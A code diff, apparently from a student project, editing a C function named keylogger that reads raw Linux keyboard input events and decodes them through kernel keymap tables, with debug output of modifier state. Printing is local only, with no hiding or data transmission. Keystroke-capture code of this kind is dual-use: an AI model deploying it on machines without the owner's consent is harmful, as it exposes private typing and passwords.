@@ -346,6 +346,7 @@ typedef struct 	s_modifiers
 	char 		*name;
 }				t_modifiers;
 
+#define KG_JENAIBESOIN 10
 t_modifiers modifiers[] = {
 	{ 0, 				KG_SHIFT,		"shift"},
 	{ KEY_RIGHTALT, 	KG_ALTGR,		"altgr"},
@@ -355,7 +356,7 @@ t_modifiers modifiers[] = {
 	{ KEY_RIGHTSHIFT, 	KG_SHIFTR,		"shiftr"},
 	{ KEY_LEFTCTRL, 	KG_CTRLL,		"ctrll"},
 	{ KEY_RIGHTCTRL, 	KG_CTRLR,		"ctrlr"},
-	{ KEY_CAPSLOCK, 	KG_CAPSSHIFT, 	"capslock"}
+	{ KEY_RIGHTMETA, 	KG_JENAIBESOIN,		"command"}
 };
 
 int						loop;
@@ -429,16 +430,16 @@ static int  		print_keysym(int code)
 		if (code < 0)
 			return printf("(null) ");
 		if (code < 0x80)
-			return printf("%s ", iso646_syms[code]);
-		return printf("%#04x ", code);
+			return printf("%s", iso646_syms[code]);
+		return printf("%#04x", code);
 	}
 	if (type == KT_LETTER)
 		type = KT_LATIN;
 	if (type < syms_size && value < syms[type].size && (p = syms[type].table[value])[0])
-		return printf("%s ", p);
+		return printf("%s", p);
 	if (type == KT_META && value < 128 && value < syms[0].size && (p = syms[0].table[value])[0])
-		return printf("Meta_%s ", p);
-	return printf("%#04x ", code);
+		return printf("Meta_%s", p);
+	return printf("%#04x", code);
 }
 
 static int 			isprintable(int code)
@@ -450,116 +451,159 @@ static void				keylogger(int keybd, int **key_table, int nb_keys, int nb_keymap)
 {
 	int					nbread;
 	struct input_event	events[128];
-	static int 			modifier = 0;
+	int 				modifier = 0; // Ctrl, Shift, Alt keys
+	int 				value = 0; // which key have been pressed
+	int 				state = 0; // state 0: released 1:pressed 2:repeated
+	int 				capslock = 0;
+	int 				numlock = 0;
 
 	signal(SIGINT, sigint);
 	loop = 1;
 	while (loop)
 	{
 		nbread = read(keybd, events, sizeof(struct input_event) * 128);
-		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
-		{
-			char *name = "UNKNOWN";
-			for (size_t j = 0; j < sizeof(event); j++)
-			{
-				if (events[i].type == event[j].value)
-				{
-					name = event[j].name;
-					break ;
-				}
-			}
-			printf("type: %s ", name);
-			if (events[i].type == EV_KEY)
-			{
-				int value = events[i].code;
-				int c = (events[i].code < nb_keys) ? key_table[events[i].code][0] : -1;
-				name = key[events[i].code].name;
-				printf("code: %c(%x \"%s\") ", c, value, name);
-			}
-			else if (events[i].type == EV_LED)
-			{
-				name = "UNKNOWN";
-				for (size_t j = 0; j < sizeof(led); j++)
-				{
-					if (events[i].code == led[j].value)
-					{
-						name = led[j].name;
-						break ;
-					}
-				}
-				printf("code: %s ", name);
-			}
-			else if (events[i].type == EV_MSC)
-			{
-				name = "UNKNOWN";
-				for (size_t j = 0; j < sizeof(key); j++)
-				{
-					if (events[i].code == msc[j].value)
-					{
-						name = msc[j].name;
-						break ;
-					}
-				}
-				printf("code: %s ", name);
-			} else {
-				printf("code: %x ", events[i].code);
-			}
-			printf("value: %#06x ; ", events[i].value);
-		}
-		printf("\n");
+		// for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
+		// {
+		// 	char *name = "UNKNOWN";
+		// 	for (size_t j = 0; j < sizeof(event); j++)
+		// 	{
+		// 		if (events[i].type == event[j].value)
+		// 		{
+		// 			name = event[j].name;
+		// 			break ;
+		// 		}
+		// 	}
+		// 	printf("type: %s ", name);
+		// 	if (events[i].type == EV_KEY)
+		// 	{
+		// 		int value = events[i].code;
+		// 		int c = (events[i].code < nb_keys) ? key_table[events[i].code][0] : -1;
+		// 		name = key[events[i].code].name;
+		// 		printf("code: %c(%x \"%s\") ", c, value, name);
+		// 	}
+		// 	else if (events[i].type == EV_LED)
+		// 	{
+		// 		name = "UNKNOWN";
+		// 		for (size_t j = 0; j < sizeof(led); j++)
+		// 		{
+		// 			if (events[i].code == led[j].value)
+		// 			{
+		// 				name = led[j].name;
+		// 				break ;
+		// 			}
+		// 		}
+		// 		printf("code: %s ", name);
+		// 	}
+		// 	else if (events[i].type == EV_MSC)
+		// 	{
+		// 		name = "UNKNOWN";
+		// 		for (size_t j = 0; j < sizeof(key); j++)
+		// 		{
+		// 			if (events[i].code == msc[j].value)
+		// 			{
+		// 				name = msc[j].name;
+		// 				break ;
+		// 			}
+		// 		}
+		// 		printf("code: %s ", name);
+		// 	} else {
+		// 		printf("code: %x ", events[i].code);
+		// 	}
+		// 	printf("value: %#06x ; ", events[i].value);
+		// }
+		// printf("\n");
 
-		int value = 0; // which key have been pressed
-		int state = 0; // state 0: released 1:pressed 2:repeated
 		int key = 0;
 		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
 		{
-			// if (events[i].type == EV_MSC) {
-			// 	if (events[i].code == MSC_SCAN) {
-			// 		value = events[i].value;
-			// 	}
-			// 	continue ;
-			// }
-			if (events[i].type == EV_KEY) {
+			if (events[i].type == EV_LED) {
+				if (events[i].code == LED_CAPSL)
+					capslock = events[i].value;
+				else if (events[i].code == LED_NUML)
+					numlock = events[i].value;
+			}
+			else if (events[i].type == EV_KEY) {
 				value = events[i].code;
-			//	if (events[i].code == value)
-					state = events[i].value;
+				state = events[i].value;
 			}
 		}
-		for (size_t i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
-			if (value == modifiers[i].value) {
-				if (state == 0)
-					modifier -= ((1 << modifiers[i].bit)); // update position on the character table values
-				else if (state == 1)
-					modifier += ((1 << modifiers[i].bit)); // update position on the character table values
-				state = 0;
-				break ;
-			}
+		if (value == KEY_LEFTSHIFT || value == KEY_RIGHTSHIFT) {
+			printf("SHIFT");
+			if (state == 0)
+				modifier -= ((1 << modifiers[0].bit)); // update position on the character table values
+			else if (state == 1)
+				modifier += ((1 << modifiers[0].bit)); // update position on the character table values
+			state = 0;
 		}
+		else if (value == KEY_RIGHTCTRL || value == KEY_LEFTCTRL) {
+			printf("CTRL%d", state);
+			if (state == 0)
+				modifier -= ((1 << modifiers[2].bit)); // update position on the character table values
+			else if (state == 1)
+				modifier += ((1 << modifiers[2].bit)); // update position on the character table values
+			state = 0;
+		}
+		else if (value == KEY_LEFTALT) {
+			printf("ALTL");
+			if (state == 0)
+				modifier -= ((1 << modifiers[3].bit)); // update position on the character table values
+			else if (state == 1)
+				modifier += ((1 << modifiers[3].bit)); // update position on the character table values
+			state = 0;
+		}
+		else if (value == KEY_RIGHTALT) {
+			printf("ALTR");
+			if (state == 0)
+				modifier -= ((1 << modifiers[1].bit)); // update position on the character table values
+			else if (state == 1)
+				modifier += ((1 << modifiers[1].bit)); // update position on the character table values
+//			state = 0;
+		}
+		else if (value == KEY_RIGHTMETA) {
+			printf("cmd %d", (1 << modifiers[8].bit));
+			if (state == 0)
+				modifier -= ((1 << modifiers[8].bit)); // update position on the character table values
+			else if (state == 1)
+				modifier += ((1 << modifiers[8].bit)); // update position on the character table values
+//			state = 0;
+		}
+		fflush(stdout);
+		// for (size_t i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
+		// 	if (value == modifiers[i].value) {
+		// 		if (state == 0)
+		// 			modifier -= ((1 << modifiers[i].bit)); // update position on the character table values
+		// 		else if (state == 1)
+		// 			modifier += ((1 << modifiers[i].bit)); // update position on the character table values
+		// 		state = 0;
+		// 		break ;
+		// 	}
+		// }
 		if (state) {
-			if (modifier) {
-				for (size_t i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
-					if (modifier & (1 << modifiers[i].bit))
-						printf("<%s>", modifiers[i].name);
-				}
-				key = key_table[value][0];
-				if (isprintable(key))
-					printf("%c", key);
-				else
-					print_keysym(key);
-				if (modifier & (1 << KG_SHIFTL) ||
-					modifier & (1 << KG_SHIFTR))
-					modifier++;
-			}
-			printf(" [%d][%d] (%d) -> ", value, modifier, K(KT_FN, value));
+			// if (modifier) {
+			// 	for (size_t i = 0; i < sizeof(modifiers) / sizeof(*modifiers); i++) {
+			// 		if (modifier & (1 << modifiers[i].bit))
+			// 			printf("<%s>+", modifiers[i].name);
+			// 	}
+			// 	key = key_table[value][0];
+			// 	print_keysym(key);
+			// }
 			key = key_table[value][modifier];
-			if (isprintable(key))
-				printf("%c", key);
-			else
+			// if (isprintable(key))
+			// 	printf("\t%c", key);
+			// else
 				print_keysym(key);
+			fflush(stdout);
+			printf(" : key_table[%d][%d] = %d\n", value, modifier, key);
+			for (int j = 0; j < nb_keymap; j++) {
+				printf("%5ld ", key_table[value][j]);
+				print_keysym(key_table[value][j]);
+				printf("(%c)", key_table[value][j]);
+				if (j && j % 5 == 0)
+					printf("\n>");
+				else
+					printf(" | ");
+			}
 			printf("\n");
-			if (modifier & (1 << KG_SHIFTL) ||
-				modifier & (1 << KG_SHIFTR))
-				modifier--;
 		}
 	}
 }
@@ -693,7 +737,7 @@ int					get_keymaps(int fd, int keymaps[2][256])
 	if (keymapnbr == 0)
 		fprintf(stderr, "cannot find any keymaps\n");
 	if (keymaps[1][0] != 0)
-		fprintf(stderr, "plain map not alocated !? oO ?!");
+		fprintf(stderr, "plain map not alocated !? o_O ?!");
 	return keymapnbr;
 }
 
